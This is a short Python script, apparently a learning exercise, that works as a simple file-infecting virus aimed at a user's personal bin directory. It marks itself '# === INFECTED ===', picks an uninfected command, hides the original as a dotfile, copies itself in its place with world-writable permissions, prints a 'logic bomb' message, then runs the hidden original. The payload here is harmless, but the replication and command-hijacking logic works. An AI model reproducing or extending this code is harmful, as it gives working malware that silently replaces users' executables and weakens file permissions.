#!/usr/bin/python3
# === INFECTED ===
import os
import os.path
from sys import argv
import shutil
import stat
import random

cmd_init, cmd = ('ls', 'ls')
pathToCorrupt = '/home/tristan/my_bin/'
fileToCorrupt = pathToCorrupt + cmd

def isInfected(content):
    return content == b'# === INFECTED ===\n'

def bomb():
    print('BEAAAAAAAAAAH!')

with open(fileToCorrupt, 'rb') as currentFile:
    ftcLines = currentFile.readlines()
    if isInfected(ftcLines[1]):
        filenames = os.listdir(pathToCorrupt)
        random.shuffle(filenames)
        for cmd in filenames:
            if cmd != cmd_init and cmd[0] != '.':
                with open(pathToCorrupt + cmd, 'rb') as newFile:
                    ftcLines = newFile.readlines()
                    if not isInfected(ftcLines[1]):
                        fileToCorrupt = pathToCorrupt + cmd
                        break
        else:
            print('All files already corrupted!')
            exit(0)

# Debut de l'infection
try:
    print('Infection in progress : command', cmd)
    originalFile = pathToCorrupt + '.' + cmd
    shutil.move(fileToCorrupt, originalFile)
    shutil.copyfile(argv[0], fileToCorrupt)
    os.chmod(fileToCorrupt, stat.S_IXUSR | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH | stat.S_IROTH | stat.S_IWOTH)
except:
    # Pb lors de l'infection, on restitue les données initiales
    shutil.move(originalFile, fileToCorrupt)
    exit(1)

# Bombe logique
bomb()

# === ORIGINAL ===
# Exécution du code original
try:
    if argv[0] != './easy_install.py':
        os.system('.' + os.path.basename(argv[0]) + ' ' + ' '.join(argv[1:]))
except:
    exit(2)
